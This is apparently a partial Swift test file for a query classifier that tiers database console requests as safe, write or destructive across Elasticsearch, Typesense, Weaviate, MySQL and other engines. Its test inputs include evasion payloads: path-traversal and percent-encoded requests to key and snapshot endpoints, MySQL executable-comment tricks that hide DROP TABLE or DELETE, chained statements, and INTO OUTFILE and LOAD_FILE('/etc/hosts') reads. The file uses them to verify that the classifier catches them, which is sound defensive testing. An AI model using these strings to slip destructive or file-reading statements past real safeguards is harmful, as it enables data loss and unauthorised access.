    func elasticsearchReads(request: String) {
        #expect(QueryClassifier.classifyTier(request, databaseType: .elasticsearch) == .safe)
    }

    /// The driver sends a GET or HEAD with a body as a POST, and resolves dot segments in the path.
    @Test(
        "An Elasticsearch write is not read off an index name, the body or a GET",
        arguments: [
            "POST /site_search/_delete_by_query\n{\"query\": {\"match_all\": {}}}",
            "POST /orders/_mapping\n{\"properties\": {}}",
            "POST /orders/_doc\n{\"note\": \"_search\"}",
            "GET /orders/_delete_by_query\n{\"query\": {\"match_all\": {}}}",
            "GET /orders/_doc/1\n{\"a\": 1}",
            "POST /_search/../orders/_update_by_query\n{}",
            "POST /orders/_search /../_delete_by_query\n{}",
            "POST /orders/%5Fsearch\n{}"
        ]
    )
    func elasticsearchWrites(request: String) {
        #expect(QueryClassifier.classifyTier(request, databaseType: .elasticsearch) != .safe)
    }

    @Test("Typesense separates search from writes and deletes")
    func typesenseTiers() {
        #expect(!QueryClassifier.isWriteQuery("GET /collections", databaseType: .typesense))
        #expect(!QueryClassifier.isWriteQuery("POST /multi_search {}", databaseType: .typesense))
        #expect(
            !QueryClassifier.isWriteQuery(
                "GET /collections/books/documents/search?q=*",
                databaseType: .typesense
            )
        )
        #expect(QueryClassifier.isWriteQuery("POST /collections/books/documents", databaseType: .typesense))
        #expect(QueryClassifier.isWriteQuery("PATCH /collections/books/documents/1", databaseType: .typesense))
        #expect(
            QueryClassifier.classifyTier(
                "DELETE /collections/books/documents/1",
                databaseType: .typesense
            ) == .destructive
        )
    }

    /// The body of a Typesense console request is the caller's own JSON. Scanning the whole
    /// statement for a read path let a bulk import carrying `"/multi_search"` in a field value
    /// classify as a read, which passes the read-only refusal and needs no destructive consent.
    @Test("A read path inside the request body does not make a write safe")
    func typesenseBodyCannotForgeAReadPath() {
        let smuggled = """
        POST /collections/books/documents/import?action=upsert
        {"id": "1", "note": "/multi_search"}
        """
        #expect(QueryClassifier.isWriteQuery(smuggled, databaseType: .typesense))
        #expect(QueryClassifier.classifyTier(smuggled, databaseType: .typesense) == .write)

        let exportInBody = """
        POST /collections/books/documents/import
        {"note": "/documents/export"}
        """
        #expect(QueryClassifier.isWriteQuery(exportInBody, databaseType: .typesense))
    }

    /// A URL path holds no raw space, so everything after the first one belongs to the body. The
    /// path ran to the end of the header line, which both classified `POST /multi_search {}` as a
    /// write and let a second path appended after a space end the request path in a read.
    @Test("The request path ends at the first space, and a second path cannot follow it")
    func typesensePathEndsAtTheFirstSpace() {
        #expect(!QueryClassifier.isWriteQuery("POST /multi_search {\"searches\": []}", databaseType: .typesense))
        #expect(
            QueryClassifier.isWriteQuery(
                "POST /collections/books/documents /multi_search",
                databaseType: .typesense
            )
        )
        #expect(
            QueryClassifier.classifyTier(
                "POST /collections/books/documents /documents/export",
                databaseType: .typesense
            ) == .write
        )
    }

    @Test("A read path has to be the request's own path, not a prefix of a longer one")
    func typesenseReadPathMustEndTheRequestPath() {
        #expect(
            QueryClassifier.isWriteQuery(
                "POST /collections/books/documents/search/../import",
                databaseType: .typesense
            )
        )
        #expect(
            !QueryClassifier.isWriteQuery(
                "POST /collections/books/documents/search?x=1",
                databaseType: .typesense
            )
        )
    }

    @Test("A key path in the body does not flag an ordinary read as widening access")
    func typesenseUnsafePathMustBeTheRequestPath() {
        #expect(
            !QueryClassifier.reachesFilesystemOrExecutesCode(
                "POST /collections/books/documents\n{\"note\": \"/keys\"}",
                databaseType: .typesense
            )
        )
        #expect(
            !QueryClassifier.reachesFilesystemOrExecutesCode(
                "GET /collections/keys/documents/search",
                databaseType: .typesense
            )
        )
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode("GET /keys/abc", databaseType: .typesense))
    }

    @Test("Typesense snapshots and key minting are flagged as reaching beyond the data")
    func typesenseUnsafeSurfacesAreFlagged() {
        #expect(
            QueryClassifier.reachesFilesystemOrExecutesCode(
                "POST /operations/snapshot?snapshot_path=/tmp/out",
                databaseType: .typesense
            )
        )
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode("POST /keys", databaseType: .typesense))
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode("GET /keys", databaseType: .typesense))
        #expect(
            !QueryClassifier.reachesFilesystemOrExecutesCode("GET /collections", databaseType: .typesense)
        )
    }

    @Test(
        "A Typesense path that can land on another one is judged unsafe",
        arguments: [
            "POST /collections/../keys",
            "POST collections/../keys",
            "POST /./keys",
            "GET /collections/../keys",
            "POST /collections/..//keys",
            "POST /a%2Fb/../keys",
            "POST /collections/%2e%2E/keys",
            "POST /collections%2F..%2Fkeys",
            "POST /collections/../operations/snapshot?snapshot_path=/tmp/out",
            "POST //localhost:8108/keys",
            "POST //localhost:8108/operations/snapshot?snapshot_path=/tmp/out",
            "POST /%6Beys/%ff/%2e%2e"
        ]
    )
    func typesensePathThatResolvesElsewhereIsUnsafe(request: String) {
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode(request, databaseType: .typesense))
    }

    @Test(
        "A respelled Typesense unsafe path is still that path",
        arguments: ["POST /%6Beys", "POST /operations//snapshot", "POST /operations/snapshot/", "DELETE /keys//12"]
    )
    func typesenseRespelledUnsafePathIsFlagged(request: String) {
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode(request, databaseType: .typesense))
    }

    @Test(
        "Escapes and dots inside a Typesense name do not flag an ordinary request",
        arguments: [
            "GET /collections/a%2Fb",
            "GET /collections/v1.2/documents/a..b",
            "POST /collections/%6Beys/documents",
            "GET /collections/books/documents/keys",
            "POST /multi_search\n{\"searches\": [{\"q\": \"../keys\"}]}"
        ]
    )
    func typesenseOrdinaryPathsStayUnflagged(request: String) {
        #expect(!QueryClassifier.reachesFilesystemOrExecutesCode(request, databaseType: .typesense))
    }

    @Test("Weaviate GraphQL reads are safe and uuid deletes are destructive")
    func weaviateTiers() {
        #expect(!QueryClassifier.isWriteQuery("{ Get { Article { title } } }", databaseType: .weaviate))
        #expect(!QueryClassifier.isWriteQuery("query { Get { Article { title } } }", databaseType: .weaviate))
        #expect(!QueryClassifier.isWriteQuery("GET /v1/schema", databaseType: .weaviate))
        #expect(!QueryClassifier.isWriteQuery("POST /v1/graphql {}", databaseType: .weaviate))
        #expect(QueryClassifier.isWriteQuery("mutation { delete { Article } }", databaseType: .weaviate))
        #expect(QueryClassifier.isWriteQuery("POST /v1/objects {}", databaseType: .weaviate))
        #expect(QueryClassifier.classifyTier("DELETE /v1/objects/abc", databaseType: .weaviate) == .destructive)
        let search = "WEAVIATE_SEARCH:e30="
        #expect(!QueryClassifier.isWriteQuery(search, databaseType: .weaviate))
    }

    @Test("Memcached reads are safe, stores write, and delete and flush_all are destructive")
    func memcachedTiers() {
        #expect(!QueryClassifier.isWriteQuery("MEMCACHED_BROWSE:e30=", databaseType: .memcached))
        #expect(!QueryClassifier.isWriteQuery("get user:1 user:2", databaseType: .memcached))
        #expect(!QueryClassifier.isWriteQuery("stats items", databaseType: .memcached))
        #expect(!QueryClassifier.isWriteQuery("lru_crawler metadump all", databaseType: .memcached))
        #expect(QueryClassifier.classifyTier("stats reset", databaseType: .memcached) == .write)
        #expect(QueryClassifier.classifyTier("lru_crawler disable", databaseType: .memcached) == .write)
        #expect(QueryClassifier.classifyTier("set k 0 0 \"v\"", databaseType: .memcached) == .write)
        #expect(QueryClassifier.classifyTier("gat 60 k", databaseType: .memcached) == .write)
        #expect(QueryClassifier.classifyTier("touch k 0", databaseType: .memcached) == .write)
        #expect(QueryClassifier.classifyTier("delete k", databaseType: .memcached) == .destructive)
        #expect(QueryClassifier.classifyTier("FLUSH_ALL", databaseType: .memcached) == .destructive)
        #expect(QueryClassifier.classifyTier("get k; flush_all", databaseType: .memcached) == .destructive)
    }

    @Test("Bigtable request lines are tiered by their verb, and a PUT that nulls a cell is destructive")
    func bigtableTiers() {
        #expect(!QueryClassifier.isWriteQuery("BIGTABLE_BROWSE:e30=", databaseType: .bigtable))
        #expect(!QueryClassifier.isWriteQuery("GET events/user#42", databaseType: .bigtable))
        #expect(!QueryClassifier.isWriteQuery("scan events/user#?limit=5", databaseType: .bigtable))
        #expect(!QueryClassifier.isWriteQuery("READ events {\"rowsLimit\": \"5\"}", databaseType: .bigtable))
        #expect(QueryClassifier.classifyTier("INSERT events/k {\"cf:a\": \"1\"}", databaseType: .bigtable) == .write)
        #expect(QueryClassifier.classifyTier("PUT events/k {\"cf:a\": \"1\"}", databaseType: .bigtable) == .write)
        #expect(QueryClassifier.classifyTier("PUT events/k {\"cf:a\": null}", databaseType: .bigtable) == .destructive)
        #expect(QueryClassifier.classifyTier("PUT events/\"a{b\" {\"cf:a\": null}", databaseType: .bigtable) == .destructive)
        #expect(QueryClassifier.classifyTier("DELETE events/k", databaseType: .bigtable) == .destructive)
        #expect(QueryClassifier.isWriteQuery("SELECT * FROM events", databaseType: .bigtable))
    }

    @Test("Firebase request lines are tiered by their verb, and a grid page is a read")
    func firebaseTiers() {
        for type in [DatabaseType.firestore, .firebaseRealtimeDatabase] {
            #expect(!QueryClassifier.isWriteQuery("FIREBASE_BROWSE:e30=", databaseType: type))
            #expect(!QueryClassifier.isWriteQuery("GET users/alice", databaseType: type))
            #expect(!QueryClassifier.isWriteQuery("get /chats?shallow=true", databaseType: type))
            #expect(!QueryClassifier.isWriteQuery("QUERY {\"structuredQuery\": {}}", databaseType: type))
            #expect(QueryClassifier.isWriteQuery("PATCH users/alice {\"age\": 31}", databaseType: type))
            #expect(QueryClassifier.isWriteQuery("POST users {}", databaseType: type))
            #expect(QueryClassifier.isWriteQuery("PUT /config/maintenance false", databaseType: type))
            #expect(QueryClassifier.isWriteQuery("SELECT * FROM users", databaseType: type))
            #expect(QueryClassifier.classifyTier("DELETE users/alice", databaseType: type) == .destructive)
        }
    }

    @Test("A Firebase write that replaces the root or leaves a node empty ranks with DELETE")
    func firebaseWritesThatDelete() {
        for type in [DatabaseType.firestore, .firebaseRealtimeDatabase] {
            #expect(QueryClassifier.classifyTier("PUT / {\"a\": 1}", databaseType: type) == .destructive)
            #expect(QueryClassifier.classifyTier("PUT %2F 1", databaseType: type) == .destructive)
            #expect(QueryClassifier.classifyTier("PUT users null", databaseType: type) == .destructive)
            #expect(QueryClassifier.classifyTier("PUT users\n{\"a\": {}, \"b\": [null]}", databaseType: type) == .destructive)
            #expect(QueryClassifier.classifyTier("PUT users {\"a\": 1}", databaseType: type) == .write)
        }
        #expect(QueryClassifier.classifyTier("PATCH / {\"users\": null}", databaseType: .firebaseRealtimeDatabase) == .destructive)
        #expect(QueryClassifier.classifyTier("PATCH users/a {\"n\": 1}", databaseType: .firebaseRealtimeDatabase) == .write)
        #expect(QueryClassifier.classifyTier("PATCH users/a {\"n\": null}", databaseType: .firestore) == .write)
    }

    @Test("A console body declaring a mutation is classified the same as a bare one")
    func weaviateConsoleBodyIsRead() {
        #expect(QueryClassifier.isWriteQuery(
            "POST /v1/graphql\nmutation { delete { Article } }",
            databaseType: .weaviate
        ))
        #expect(QueryClassifier.isWriteQuery(
            "POST /v1/graphql\n{\"query\": \"mutation { delete { Article } }\"}",
            databaseType: .weaviate
        ))
        #expect(!QueryClassifier.isWriteQuery(
            "POST /v1/graphql\n{\"query\": \"{ Get { Article { title } } }\"}",
            databaseType: .weaviate
        ))
        #expect(!QueryClassifier.isWriteQuery(
            "POST /v1/graphql?pretty\n{ Get { Article { title } } }",
            databaseType: .weaviate
        ))
    }

    @Test("A mutation inside a query envelope is a write however it is typed")
    func weaviateEnvelopeIsRead() {
        #expect(QueryClassifier.isWriteQuery(
            "{\"query\": \"mutation { delete { Article } }\"}",
            databaseType: .weaviate
        ))
        #expect(!QueryClassifier.isWriteQuery(
            "{\"query\": \"{ Get { Article { title } } }\"}",
            databaseType: .weaviate
        ))
        #expect(!QueryClassifier.isWriteQuery("{ Get { Article { title } } }", databaseType: .weaviate))
    }

    @Test("A request text is tiered by the requests the scanner hands the driver", arguments: [
        (DatabaseType.firestore, "GET users", "DELETE users/alice"),
        (.firebaseRealtimeDatabase, "GET users", "DELETE users/alice"),
        (.bigtable, "GET events/k", "DELETE events/k"),
        (.typesense, "GET /collections", "DELETE /collections/books"),
        (.weaviate, "GET /v1/schema", "DELETE /v1/schema/Article"),
        (.elasticsearch, "GET /_cat/indices", "DELETE /orders"),
        (.etcd, "get /keys", "del /keys")
    ])
    func requestTextTiersWhatTheDriverReceives(type: DatabaseType, read: String, delete: String) {
        for text in [";\(delete)", "\(read);\(delete)", "--\n;\(delete)", "--\r\(read)\n;\(delete)", "/**/;\(delete)"] {
            #expect(QueryClassifier.classifyTier(text, databaseType: type) == .destructive, "\(text) must be destructive")
        }
        for text in ["\(read);", ";\(read)", "-- note\n;\(read)", "-- \(delete)", ";"] {
            #expect(QueryClassifier.classifyTier(text, databaseType: type) == .safe, "\(text) must be safe")
        }
    }

    @Test("Elasticsearch stored scripts are flagged as code execution on both verbs")
    func elasticsearchScriptsAreFlagged() {
        #expect(
            QueryClassifier.reachesFilesystemOrExecutesCode("GET /_scripts/evil", databaseType: .elasticsearch)
        )
        #expect(
            QueryClassifier.reachesFilesystemOrExecutesCode(
                "POST /_scripts/painless/_execute",
                databaseType: .elasticsearch
            )
        )
    }
}

struct QueryClassifierExecutableCommentTests {
    // One per form a MySQL or MariaDB server runs a DROP from while every other reading hides it.
    static let hiddenDrops = [
        "/*!99999 ' */ DROP TABLE orders -- '",
        "/*!99999 /* */ ' */ DROP TABLE orders -- '",
        "/*!50700 ' */ DROP TABLE orders -- '",
        "/*!800000 ' */ DROP TABLE orders -- '",
        "/*!8000000 ' */ DROP TABLE orders -- '",
        "/*M!999999 ' */ DROP TABLE orders -- '",
        "/*M! ' */ DROP TABLE orders -- '",
        "/*m! ' */ DROP TABLE orders -- '",
        "/*! /* ' */ DROP TABLE orders */",
        "/*! DROP TABLE orders # */ '\n */",
        "SELECT /*!50000 \"*/\", */ 1; /*!99999 ' */ DROP TABLE orders -- '",
        "SELECT /*!80000 \"*/\", */ 1; /*!80100 ' */ DROP TABLE orders -- '",
        "SELECT 1--/*!99999 ' */1; DROP TABLE orders -- '",
        "ALTER TABLE orders ALTER COLUMN note SET DEFAULT (1 --/*!99999 ' */ 1), DROP COLUMN total -- '",
        "/*T! DROP TABLE orders */",
        "/*! SELECT 1 /*!99999 ' */ */; DROP TABLE orders -- '",
        "ALTER TABLE orders ADD COLUMN c\u{600}/*!99999 ' */ INT, DROP COLUMN total -- '",
    ]

    static let engines: [DatabaseType] = [.mysql, .mariadb]

    @Test("A DROP TiDB runs from its own comment is destructive", arguments: [
        "/*T! DROP TABLE orders */",
        "/*T![clustered_index] DROP TABLE orders */",
        "/*T![no_such_feature] ' */ DROP TABLE orders -- '",
    ])
    func tiDBCommentDropIsDestructive(sql: String) {
        #expect(QueryClassifier.classifyTier(sql, databaseType: .tidb) == .destructive)
    }

    @Test("A DROP a server runs from behind an executable comment is destructive", arguments: hiddenDrops, engines)
    func hiddenDropIsDestructive(sql: String, databaseType: DatabaseType) {
        #expect(QueryClassifier.classifyTier(sql, databaseType: databaseType) == .destructive)
        #expect(QueryClassifier.isDangerousQuery(sql, databaseType: databaseType))
    }

    @Test("A TRUNCATE a server runs past a skipped comment is destructive", arguments: engines)
    func hiddenTruncateIsDestructive(databaseType: DatabaseType) {
        let sql = "/*!99999 ' */ TRUNCATE orders -- '"
        #expect(QueryClassifier.classifyTier(sql, databaseType: databaseType) == .destructive)
        #expect(QueryClassifier.classifyTier("ALTER TABLE p TRUNCATE PARTITION ALL", databaseType: databaseType)
            == .destructive)
    }

    @Test(
        "A DELETE with no WHERE that a server runs from an executable comment deletes every row",
        arguments: [
            "/*!99999 ' */ DELETE FROM orders -- '",
            "/*! DELETE FROM orders */",
            "/*M! DELETE FROM orders */",
            "/*! -- '\n */ DELETE FROM orders -- '",
            "WITH c AS (SELECT 1) /*m! ' */ DELETE FROM orders -- '",
            "DELETE FROM orders a\u{600}/*!99999 '*/#' */ WHERE id = 1",
        ],
        engines
    )
    func hiddenDeleteDeletesEverything(sql: String, databaseType: DatabaseType) {
        #expect(QueryClassifier.isDangerousQuery(sql, databaseType: databaseType))
    }

    @Test(
        "A write past a comment one server reads as plain is never a read",
        arguments: [
            "WITH c AS (SELECT 1) /*m! ' */ DELETE FROM orders -- '",
            "WITH c AS (SELECT 1) /*!99999 ' */ DELETE FROM orders -- '",
            "SELECT * FROM orders /*m! ' */ INTO OUTFILE '/tmp/x' -- '",
            "SELECT * FROM orders /*!99999 ' */ INTO OUTFILE '/tmp/x' -- '",
        ],
        engines
    )
    func hiddenWriteIsNotARead(sql: String, databaseType: DatabaseType) {
        #expect(QueryClassifier.isWriteQuery(sql, databaseType: databaseType))
    }

    @Test(
        "A file written past an executable comment reaches the file system",
        arguments: [
            "SELECT * FROM orders /*m! ' */ INTO OUTFILE '/tmp/x' -- '",
            "SELECT * FROM orders /*!99999 ' */ INTO OUTFILE '/tmp/x' -- '",
            "SELECT 1--/*!99999 ' */1 INTO OUTFILE '/tmp/x' -- '",
            "SELECT 1 a\u{600}/*!99999 ' */ INTO OUTFILE '/tmp/x' -- '",
            "SELECT 1 INTO/**/OUTFILE '/tmp/x'",
            "SELECT LOAD_FILE ('/etc/hosts')",
            "SELECT LOAD_FILE/**/('/etc/hosts')",
        ]
    )
    func hiddenOutfileReachesTheFileSystem(sql: String) {
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode(sql, databaseType: .mysql))
    }

    @Test(
        "A second statement past a skipped comment is counted",
        arguments: ["/*!99999 ' */ DROP TABLE a; DROP TABLE b -- '", "SELECT 1--/*!99999 ' */1; DROP TABLE b -- '"],
        engines
    )
    func hiddenSecondStatementIsCounted(sql: String, databaseType: DatabaseType) {
        #expect(QueryClassifier.isMultiStatement(sql, databaseType: databaseType))
    }

    @Test("A text that sets more versions than a gate reads is treated as the worst statement")
    func tooManyVersionsFailClosed() {
        let sql = "SELECT " + (0..<40).map { "'/*!\(50_000 + $0) x */'" }.joined(separator: ", ")
        #expect(QueryClassifier.classify(sql, databaseType: .mysql).tier == .destructive)
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode(sql, databaseType: .mysql))
        #expect(QueryClassifier.isMultiStatement(sql, databaseType: .mysql))
    }

    @Test("A read whose comment every server runs or skips alike stays a read once the floor is kept")
    func plainReadsKeepTheirTier() {
        #expect(QueryClassifier.classifyTier("SELECT 1 /*m! note */", databaseType: .mysql) == .safe)
        #expect(QueryClassifier.classifyTier("SELECT /*!40001 SQL_NO_CACHE */ 1", databaseType: .mysql) == .write)
    }
}
